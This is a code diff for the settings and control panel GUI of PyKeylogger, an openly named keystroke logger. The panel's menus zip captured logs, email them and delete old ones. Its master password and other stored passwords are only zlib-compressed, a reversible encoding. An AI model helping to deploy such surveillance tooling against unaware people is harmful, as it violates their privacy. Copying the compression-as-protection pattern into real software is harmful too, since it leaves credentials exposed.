@@ -1,27 +1,46 @@
 from Tkinter import *
-import tkSimpleDialog, tkMessageBox
-import ConfigParser
+import mytkSimpleDialog # mytkSimpleDialog adds relative widnow placement configuration to tkSimpleDialog
+import tkMessageBox
+#import ConfigParser
+from configobj import ConfigObj
+from validate import Validator
 from tooltip import ToolTip
+import zlib
 
 class PyKeyloggerControlPanel:
-    def __init__(self, settings, mainapp):
+    def __init__(self, cmdoptions, mainapp):
+        self.cmdoptions=cmdoptions
         self.mainapp=mainapp
-        self.settings=settings
+        self.panelsettings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)
+
         self.root = Tk()
-        #self.root.config(height=20, width=20)
+        self.root.config(height=20, width=20)
+        self.root.geometry("+200+200")
+        self.root.protocol("WM_DELETE_WINDOW", self.ClosePanel)
         #self.root.iconify()
-        self.PasswordDialog()
-        self.root.title("PyKeylogger Control Panel")
+        #if self.panelsettings['General']['Master Password'] != "x\x9c\x03\x00\x00\x00\x00\x01":
+        #    self.PasswordDialog()
+        #print len(self.panelsettings['General']['Master Password'])
+        #print zlib.decompress(self.panelsettings['General']['Master Password'])
+        passcheck = self.PasswordDialog()
+        
         # call the password authentication widget
         # if password match, then create the main panel
-        self.InitializeMainPanel()
-        self.root.mainloop()
+        if passcheck == 0:
+            self.InitializeMainPanel()
+            self.root.mainloop()
+        elif passcheck == 1:
+            self.ClosePanel()
         
     def InitializeMainPanel(self):
         #create the main panel window
         #root = Tk()
         #root.title("PyKeylogger Control Panel")
         # create a menu
+
+        self.root.title("PyKeylogger Control Panel")
+        self.root.config(height=200, width=200)
+        
         menu = Menu(self.root)
         self.root.config(menu=menu)
 
@@ -30,73 +49,97 @@ class PyKeyloggerControlPanel:
         actionmenu.add_command(label="Flush write buffers", command=Command(self.mainapp.lw.FlushLogWriteBuffers, "Flushing write buffers at command from control panel."))
         actionmenu.add_command(label="Zip Logs", command=Command(self.mainapp.lw.ZipLogFiles))
         actionmenu.add_command(label="Send logs by email", command=Command(self.mainapp.lw.SendZipByEmail))
-        actionmenu.add_command(label="Upload logs by FTP", command=self.callback) #do not have this method yet
-        actionmenu.add_command(label="Upload logs by SFTP", command=self.callback) # do not have this method yet
-        actionmenu.add_command(label="Delete logs older than " + self.settings['maxlogage'] + " days", command=Command(self.mainapp.lw.DeleteOldLogs))
+        #actionmenu.add_command(label="Upload logs by FTP", command=self.callback) #do not have this method yet
+        #actionmenu.add_command(label="Upload logs by SFTP", command=self.callback) # do not have this method yet
+        actionmenu.add_command(label="Delete logs older than " + self.panelsettings['Log Maintenance']['Max Log Age'] + " days", command=Command(self.mainapp.lw.DeleteOldLogs))
         actionmenu.add_separator()
-        actionmenu.add_command(label="Close Control Panel", command=self.root.destroy)
+        actionmenu.add_command(label="Close Control Panel", command=self.ClosePanel)
         actionmenu.add_command(label="Quit PyKeylogger", command=self.mainapp.stop)
 
         optionsmenu = Menu(menu)
         menu.add_cascade(label="Configuration", menu=optionsmenu)
-        optionsmenu.add_command(label="General Settings", command=Command(self.CreateConfigPanel, "general"))
-        optionsmenu.add_command(label="Email Settings", command=Command(self.CreateConfigPanel, "email"))
-        optionsmenu.add_command(label="FTP Settings", command=Command(self.CreateConfigPanel, "ftp"))
-        optionsmenu.add_command(label="SFTP Settings", command=Command(self.CreateConfigPanel, "sftp"))
-        optionsmenu.add_command(label="Log Maintenance Settings", command=Command(self.CreateConfigPanel, "logmaintenance"))
-        optionsmenu.add_command(label="Timestamp Settings", command=Command(self.CreateConfigPanel, "timestamp"))
+        for section in self.panelsettings.sections:
+            optionsmenu.add_command(label=section + " Settings", command=Command(self.CreateConfigPanel, section))
 
-        #self.root.mainloop()
-        
     def PasswordDialog(self):
         #passroot=Tk()
         #passroot.title("Enter Password")
-        mypassword = tkSimpleDialog.askstring("Enter Password", "enter it:", show="*")
-
+        mypassword = mytkSimpleDialog.askstring("Enter Password", "Password:", show="*", rootx_offset=-20, rooty_offset=-35)
+        if mypassword != zlib.decompress(self.panelsettings['General']['Master Password']):
+            if mypassword != None:
+                tkMessageBox.showerror("Incorrect Password", "Incorrect Password")
+            return 1
+        else:
+            return 0
+            
+    def ClosePanel(self):
+        self.mainapp.panel = False
+        self.root.destroy()
+        
     def callback(self):
         tkMessageBox.showwarning(title="Not Implemented", message="This feature has not yet been implemented")
         
-    def CreateConfigPanel(self, section="general"):
-        self.panelconfig = ConfigParser.SafeConfigParser()
-        self.panelconfig.readfp(open(self.settings['configfile']))
-        self.panelsettings = dict(self.panelconfig.items(section))
-        self.configpanel = ConfigPanel(self.root, title=section + " settings", settings=self.panelsettings)
-        # now we dump all this in a frame in root window in a grid
+    def CreateConfigPanel(self, section):
+        
+        # reload the settings so that we are reading from the file, 
+        # rather than from the potentially modified but not yet written out configobj
+        del(self.panelsettings)
+        self.panelsettings=ConfigObj(self.cmdoptions.configfile, configspec=self.cmdoptions.configval, list_values=False)
+        
+        self.configpanel = ConfigPanel(self.root, title=section + " Settings", settings=self.panelsettings, section=section)
+        
 
-class ConfigPanel(tkSimpleDialog.Dialog):
+class ConfigPanel(mytkSimpleDialog.Dialog):
 
-    def __init__(self, parent, title=None, settings={}):
+    def __init__(self, parent, settings, section, title=None):
         self.settings=settings
-        tkSimpleDialog.Dialog.__init__(self, parent, title)
+        self.section=section
+        mytkSimpleDialog.Dialog.__init__(self, parent, title)
 
     def body(self, master):
         
         index=0
         self.entrydict=dict()
         self.tooltipdict=dict()
-        for key in self.settings.keys():
-            if key.find("tooltip") == -1:
+        for key in self.settings[self.section].keys():
+            if key.find("Tooltip") == -1:
                 Label(master, text=key).grid(row=index, sticky=W)
                 self.entrydict[key]=Entry(master)
-                self.entrydict[key].insert(END, self.settings[key])
+                if key.find("Password") == -1:
+                    self.entrydict[key].insert(END, self.settings[self.section][key])
+                else:
+                    self.entrydict[key].insert(END, zlib.decompress(self.settings[self.section][key]))
                 self.entrydict[key].grid(row=index, column=1)
-                self.tooltipdict[key] = ToolTip(self.entrydict[key], follow_mouse=1, delay=500, text=self.settings[key + "tooltip"])
+                self.tooltipdict[key] = ToolTip(self.entrydict[key], follow_mouse=1, delay=500, text=self.settings[self.section][key + " Tooltip"])
                 index += 1
-            
+    
+    def validate(self):
         
+        for key in self.entrydict.keys():
+            if key.find("Password") == -1:
+                self.settings[self.section][key] = self.entrydict[key].get()
+            else:
+                self.settings[self.section][key] = zlib.compress(self.entrydict[key].get())
+        
+        errortext="Some of your input contains errors. Detailed error output below.\n\n"
+        
+        val = Validator()
+        valresult=self.settings.validate(val, preserve_errors=True)
+        if valresult != True:
+            if valresult.has_key(self.section):
+                sectionval = valresult[self.section]
+                for key in sectionval.keys():
+                    if sectionval[key] != True:
+                        errortext += "Error in item \"" + str(key) + "\": " + str(sectionval[key]) + "\n"
+                tkMessageBox.showerror("Erroneous input. Please try again.", errortext)
+            return 0
+        else:
+            return 1
     
     def apply(self):
-        pass
-    #~ def __init__(self):
-        #~ # create app window with sensitive data settings
-        #~ # general password
-        #~ # smtpusername
-        #~ # smtppassword
-        #~ # ftpusername
-        #~ # ftppassword
-        #~ # sftpusername
-        #~ # sftppassword
-        #~ pass
+        # this is where we write out the config file to disk
+        self.settings.write()
+        tkMessageBox.showinfo("Restart PyKeylogger", "You must restart PyKeylogger for the new settings to take effect.")
 
 class Command:
     ''' A class we can use to avoid using the tricky "Lambda" expression.
@@ -116,7 +159,7 @@ class Command:
 
 if __name__ == '__main__':
     # some simple testing code
-    settings={"bla":"mu", 'maxlogage': "2.0", "configfile":"pykeylogger.ini"}
+    settings={"bla":"mu", 'maxlogage': "2.0", "configfile":"practicepykeylogger.ini"}
     class BlankKeylogger:
         def stop(self):
             pass
@@ -132,6 +175,12 @@ if __name__ == '__main__':
             pass
         def DeleteOldLogs(self):
             pass
-        
+    
+    class BlankOptions:
+        def __init__(self):
+            self.configfile="pykeylogger.ini"
+            self.configval="pykeylogger.val"
+    
     klobject=BlankKeylogger()
-    myapp = PyKeyloggerControlPanel(settings, klobject)
+    cmdoptions=BlankOptions()
+    myapp = PyKeyloggerControlPanel(cmdoptions, klobject)
